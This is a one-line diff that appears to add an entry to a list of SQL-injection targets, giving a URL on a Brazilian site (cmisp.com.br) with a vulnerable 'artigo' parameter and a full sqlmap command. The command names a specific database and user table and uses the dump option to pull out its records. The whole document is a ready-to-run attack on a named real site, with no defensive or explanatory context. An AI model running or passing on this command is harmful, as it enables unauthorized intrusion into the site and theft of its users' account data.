@@ -1,0 +1,1 @@
+https://www.cmisp.com.br/noticias-filtra.php?artigo=922 (GET)  # sqlmap.py -u https://www.cmisp.com.br/noticias-filtra.php?artigo=922 -D cmisp22 --threads 5 -v3 --random-agent -T SITE_V4_USER --dump
